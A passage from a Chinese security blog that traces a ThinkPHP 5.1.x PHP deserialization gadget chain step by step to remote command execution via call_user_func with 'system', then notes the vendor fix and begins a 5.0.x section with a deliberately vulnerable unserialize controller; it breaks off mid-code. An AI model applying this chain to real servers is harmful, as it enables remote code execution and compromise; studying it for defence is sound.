<p>首先在unserialize函数下断点，之后再浏览器中输入payload：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458375097-c4f462e5-2a01-4cf7-988e-544b3b1a87b5.png#averageHue=%232e302b&clientId=u0e157718-5316-4&from=paste&height=242&id=u28cc6d4e&name=image.png&originHeight=302&originWidth=1425&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=626647&status=done&style=none&taskId=u0649fa17-ecd5-4aed-b627-1fe9ce703ac&title=&width=1140" alt="image.png"><br>这是反序列化入口，往下跟一下，观察POC，最外层套的是<code>think\process\pipes\Windows</code>对象，因此会进入该对象中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458552612-faa53067-a64a-461a-a75c-2b320eaab6f5.png#averageHue=%232c2e2b&clientId=u0e157718-5316-4&from=paste&height=472&id=u8c7ab7f9&name=image.png&originHeight=590&originWidth=1864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1609898&status=done&style=none&taskId=uf843702c-c977-47cf-89e8-99d004a6310&title=&width=1491.2" alt="image.png"><br>入口是<code>think\process\pipes\Windows</code>的<code>__destruct</code>魔术方法，在这里调用了<code>removeFiles</code>方法，跟进该方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458659533-7bb34780-0d3a-49a0-8984-1bfb2a193364.png#averageHue=%23292b2a&clientId=u0e157718-5316-4&from=paste&height=595&id=u834be4d4&name=image.png&originHeight=744&originWidth=1441&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1379866&status=done&style=none&taskId=ua2cc4ff7-63ec-47b5-be5a-67f7ab65a9e&title=&width=1152.8" alt="image.png"><br>在removeFiles方法，用<code>file_exists</code>方法检测文件是否存在，但是这里我们将filename属性改为了一个<code>think\model]\Pivot</code>对象，因此会触发它的<code>toString</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458748880-1c29e47b-4f8e-40b6-9d56-34450153ac65.png#averageHue=%232d2f2c&clientId=u0e157718-5316-4&from=paste&height=783&id=ud5ca356b&name=image.png&originHeight=979&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2460425&status=done&style=none&taskId=u9caa295e-2f86-4a42-ae42-cc8cd5519f3&title=&width=1489.6" alt="image.png"><br>可能在这里大家就觉得比较奇怪了，不是说好了是<code>Pivot</code>对象吗，为什么是<code>Conversion</code>对象，这里我们就需要回顾到上面说的基础知识了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458797718-7ff08f90-758c-43f7-be60-4d9d06bf28ad.png#averageHue=%232b2c29&clientId=u0e157718-5316-4&from=paste&height=342&id=u8818b222&name=image.png&originHeight=427&originWidth=1206&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=629442&status=done&style=none&taskId=ubece7312-fb21-4607-b16c-1e91a4eab7f&title=&width=964.8" alt="image.png"><br>首先Conversion被trait进行修饰了，其次我们再观察一下Pivot对象的内部：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458866628-d003da32-b202-45ec-8bb3-1959134201cc.png#averageHue=%232c2e2a&clientId=u0e157718-5316-4&from=paste&height=454&id=ud8ce346e&name=image.png&originHeight=567&originWidth=1867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1317153&status=done&style=none&taskId=uf9999cf6-9868-46cb-9e00-64bf0d96a2f&title=&width=1493.6" alt="image.png"><br>它内部是没有toString魔术方法的，但是构造方法中调用的是父类的构造方法，他的父类是<code>Model</code>对象：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458898888-0403ec23-cb1e-4b7f-a1f7-f8f2738e3e50.png#averageHue=%23323431&clientId=u0e157718-5316-4&from=paste&height=137&id=ub147ccae&name=image.png&originHeight=171&originWidth=770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=176834&status=done&style=none&taskId=u57c3df32-6511-4083-8213-30608340b41&title=&width=616" alt="image.png"><br>跟进Model对象：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677458916060-ebb09e75-2de6-41fa-a507-19d7f459326c.png#averageHue=%232b2d29&clientId=u0e157718-5316-4&from=paste&height=298&id=uc9a8e4b6&name=image.png&originHeight=373&originWidth=1287&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=599075&status=done&style=none&taskId=u2e3a394d-c92c-461f-ab73-53e94516629&title=&width=1029.6" alt="image.png"><br>到这里紧皱的眉头突然舒展开来，也就是Model类在它的内部复用了被<code>trait</code>修饰的<code>Conversion</code>对象，而Model又是Pivot的父类，因此当Pivot被当成字符串输出时，就会调用Conversion类的toString方法，这一点网上没一篇文章讲到，所以我觉得有必要讲一下的，流程图大概如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459350948-dbb6cd39-8803-470a-b65d-3b9449673ba8.png#averageHue=%23fbfbfb&clientId=u0e157718-5316-4&from=paste&height=324&id=u2c18bb5b&name=image.png&originHeight=405&originWidth=1118&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35689&status=done&style=none&taskId=u5d659110-d16c-49cf-90dc-c4a3ac0f2f2&title=&width=894.4" alt="image.png"><br>那么接下来就能继续往下走了，之后就调用了tojson方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459424099-5ebd4d29-3571-4a42-836d-f354d06d5615.png#averageHue=%232e2f2c&clientId=u0e157718-5316-4&from=paste&height=141&id=ud1ad647a&name=image.png&originHeight=176&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=279774&status=done&style=none&taskId=u8c8f301b-9b77-4701-bd59-c3fb0161e67&title=&width=1000" alt="image.png"><br>又调用了toArray：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459464347-55d7022f-a6ef-436e-a429-6d3ed7fb6191.png#averageHue=%232c2d29&clientId=u0e157718-5316-4&from=paste&height=250&id=u6679f038&name=image.png&originHeight=313&originWidth=1417&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=563709&status=done&style=none&taskId=u6811618f-9112-468b-91fe-26b98197536&title=&width=1133.6" alt="image.png"><br>在这里就有3个点了，先遍历<code>this-&gt;append</code>属性，取出键值对，这里我们poc中对应为：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459634107-37ea5f39-328b-4d55-b22f-96b9d9e42edf.png#averageHue=%2332342f&clientId=u0e157718-5316-4&from=paste&height=93&id=u353eb9a3&name=image.png&originHeight=116&originWidth=684&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=113393&status=done&style=none&taskId=ud6758a0b-a59b-4284-80b5-8ae9138b9db&title=&width=547.2" alt="image.png"><br>因此key为boogipop，进入getRelation方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459659840-37e5b3ea-cdf9-42fa-bb86-d04306c73796.png#averageHue=%232e302c&clientId=u0e157718-5316-4&from=paste&height=203&id=u7957334d&name=image.png&originHeight=254&originWidth=987&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=327286&status=done&style=none&taskId=u8a09b294-830d-41e3-a0d1-994e87617c6&title=&width=789.6" alt="image.png"><br>由于我<code>$name(boogipop)</code>不是null，并且我们没给<code>$this-&gt;relation</code>进行赋值，因此直接return一个null回来，接着就进入<code>getAttr</code>方法:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459760965-5456482f-7932-4717-8c08-df93ea6cb8b8.png#averageHue=%232a2c28&clientId=u0e157718-5316-4&from=paste&height=283&id=u633d98be&name=image.png&originHeight=354&originWidth=1329&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=579598&status=done&style=none&taskId=u1fecbc29-d604-4d39-b40e-4ff75c3af30&title=&width=1063.2" alt="image.png"><br>在里面又调用了getData方法，跟进该方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677459920604-af0f59bc-cc17-4c0c-96fb-5860c3490160.png#averageHue=%232b2d2a&clientId=u0e157718-5316-4&from=paste&height=546&id=u4644bcb5&name=image.png&originHeight=682&originWidth=1519&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1346092&status=done&style=none&taskId=u72155712-81fa-4495-bcef-1dbe391d296&title=&width=1215.2" alt="image.png"><br>在上述poc中我们将<code>$this-&gt;data</code>赋值为了一个<code>Request</code>对象，因此return一个Request对象，之后退出该方法回到外面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677460029115-3b10a8ae-d1ef-4ba4-9680-f4c6c813f6b5.png#averageHue=%23282a28&clientId=u0e157718-5316-4&from=paste&height=593&id=u42b4d302&name=image.png&originHeight=741&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1357743&status=done&style=none&taskId=ud1c24bf5-8608-45c6-b54c-f147adb8175&title=&width=1122.4" alt="image.png"><br>这里<code>$relation</code>经过上述步骤变为Request对象，调用visible方法触发了<code>Request</code>对象的<code>__call</code>魔术方法，因为不存在该方法，参数为<code>[calc,calc.exe]</code>也就是我们自定义的那个键值对：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677460341974-e8a04454-8e43-4f2d-85b2-e210582d9aa3.png#averageHue=%23292b29&clientId=u0e157718-5316-4&from=paste&height=546&id=uc3fdd161&name=image.png&originHeight=682&originWidth=1440&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1269362&status=done&style=none&taskId=u09ed2ae5-cc0a-4c01-8cb4-b9a99e0879d&title=&width=1152" alt="image.png"><br>首先使用<code>array_shift</code>往之前的<code>[calc,calc.exe]</code>数组插入<code>$this</code>也就是<code>Request</code>对象，之后调用<code>call_user_func_array</code>方法，其中<code>$this-&gt;hook[$method]</code>就是<code>$this-&gt;hook[&#39;visible&#39;]</code>，在POC中为<code>isAjax</code>方法，跟进该方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677460505292-d13c95d2-d1ca-4872-8537-3e9599cbe06c.png#averageHue=%232a2c29&clientId=u0e157718-5316-4&from=paste&height=469&id=u478f1750&name=image.png&originHeight=586&originWidth=1514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1161038&status=done&style=none&taskId=u8dcb082a-b5d0-477e-989e-bb096ed7688&title=&width=1211.2" alt="image.png"><br>调用<code>Param</code>方法，参数为我们poc中的<code>boogipop</code>，跟进该方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677460760976-839c0ca2-4f26-40fe-aa44-88198e7e0d11.png#averageHue=%23292c29&clientId=u0e157718-5316-4&from=paste&height=570&id=ubd5aa029&name=image.png&originHeight=712&originWidth=1376&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1218551&status=done&style=none&taskId=ub3a06120-e864-4841-8828-420677f89c7&title=&width=1100.8" alt="image.png"><br>在这个方法中会将GET数组赋值给<code>this-&gt;param</code>属性，然后<code>$name</code>就是之前说的boogipop，跟进input方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先进入<code>getData</code>方法，在该方法我们可以获取恶意传参：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462538043-35983ae1-6764-4a28-9407-bd434eabe235.png#averageHue=%232a2b28&clientId=u0e157718-5316-4&from=paste&height=374&id=u8e912c93&name=image.png&originHeight=467&originWidth=1382&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=807906&status=done&style=none&taskId=u65b629ab-63e3-4d2c-99b5-d35967057ee&title=&width=1105.6" alt="image.png"><br><code>$name</code>是上一轮带下来的，也就是boogipop，这里从GET数组获取键名为<code>boogipop</code>的键值，也就是<code>whoami</code>，得到whoami后返回，继续进入<code>getFilter</code>方法获取filter属性：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462674552-a1ec3378-796c-43c0-9ca7-c8cd8c8135bf.png#averageHue=%232b2c2a&clientId=u0e157718-5316-4&from=paste&height=525&id=u1e211ede&name=image.png&originHeight=656&originWidth=1355&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1098200&status=done&style=none&taskId=uceeb872a-92f2-4e7a-a6d4-d1e03dddc71&title=&width=1084" alt="image.png"><br>在param方法中，filter参数为空，因此在这里先为空，然后将<code>this-&gt;filter</code>属性赋值给<code>$filter</code>变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462722641-f3c4c1c8-52ca-4ba7-a931-e1df54b33abc.png#averageHue=%23292b29&clientId=u0e157718-5316-4&from=paste&height=472&id=u9b0668d8&name=image.png&originHeight=590&originWidth=1450&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1103441&status=done&style=none&taskId=ufa8bb5ca-a5ca-45c9-b5eb-5eb213e4670&title=&width=1160" alt="image.png"><br>然后在<code>$filter</code>数组追加一个<code>$default</code>变量，这里为null，不影响，之后就将该filter数组return回去，这时候<code>$filter=[&#39;system&#39;,null]</code>:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462808345-85520841-c5f7-4e24-8bf5-5e39b496078c.png#averageHue=%23292b2a&clientId=u0e157718-5316-4&from=paste&height=513&id=ua64fdcb0&name=image.png&originHeight=641&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1196258&status=done&style=none&taskId=u3bada408-6c0b-4895-b6db-a2d2c220cba&title=&width=1164.8" alt="image.png"><br>最后进入filterValue方法，其中各个变量对应红框中的值：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">               <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">               <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="comment">// 正则过滤</span></span><br><span class="line">                   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                       <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                       <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                   <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                   <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                   <span class="variable">$value</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, <span class="title function_ invoke__">is_int</span>(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : <span class="title function_ invoke__">filter_id</span>(<span class="variable">$filter</span>));</span><br><span class="line">                   <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$value</span>) &#123;</span><br><span class="line">                       <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462851375-ccae3b1f-df60-4d9f-8075-f6b46cd24b49.png#averageHue=%232d2e2a&clientId=u0e157718-5316-4&from=paste&height=66&id=uf98c9905&name=image.png&originHeight=83&originWidth=871&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92718&status=done&style=none&taskId=ub11eefe3-80c3-4dc1-9206-a6ecc5ec970&title=&width=696.8" alt="image.png"><br>先用arraypop弹出数组末尾的元素，因此只剩下system<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677462842790-481d67c2-1f0e-4c01-98cf-70c79a185bc0.png#averageHue=%23292a27&clientId=u0e157718-5316-4&from=paste&height=104&id=u84f4e6e8&name=image.png&originHeight=130&originWidth=1392&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235770&status=done&style=none&taskId=u640f02bc-12cf-4786-a8f0-f026434607e&title=&width=1113.6" alt="image.png"><br>随之调用<code>call_user_func</code>方法，完成RCE<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png#averageHue=%232c313d&clientId=u0e157718-5316-4&from=paste&id=u705a915f&name=image.png&originHeight=886&originWidth=1421&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=333657&status=done&style=none&taskId=udbeab041-29e1-4e3e-97e2-5d709d1b8a7&title=" alt="image.png"><br>贴一张其他师傅的图</p>
<h2 id="（4）修复方法"><a href="#（4）修复方法" class="headerlink" title="（4）修复方法"></a>（4）修复方法</h2><p>官方直接把<code>Request</code>中的<code>__call</code>魔术方法给抹除了，因此链子后半段就断掉了</p>
<h1 id="四、ThinkPHP5-2-x反序列化链"><a href="#四、ThinkPHP5-2-x反序列化链" class="headerlink" title="四、ThinkPHP5.2.x反序列化链"></a>四、ThinkPHP5.2.x反序列化链</h1><h2 id="README"><a href="#README" class="headerlink" title="README"></a>README</h2><p>5.2属于内测版，找不到下载的资源。。。无法复现<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6619#toc-2">https://xz.aliyun.com/t/6619#toc-2</a><br>可以参考这篇文章，实在是找不到5.2版本了<br>然后好像破案了，5.2貌似就是现在的6.0版本（shit），这部分放到6.0</p>
<h1 id="五、ThinkPHP5-0-x反序列化链"><a href="#五、ThinkPHP5-0-x反序列化链" class="headerlink" title="五、ThinkPHP5.0.x反序列化链"></a>五、ThinkPHP5.0.x反序列化链</h1><h2 id="（1）环境搭建-1"><a href="#（1）环境搭建-1" class="headerlink" title="（1）环境搭建"></a>（1）环境搭建</h2><ul>
<li>PHP7.3+Xdebug+thinkphp5.0.24+IDEA</li>
</ul>
<p>也是像上面一样准备一个二次发序列化入口</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span 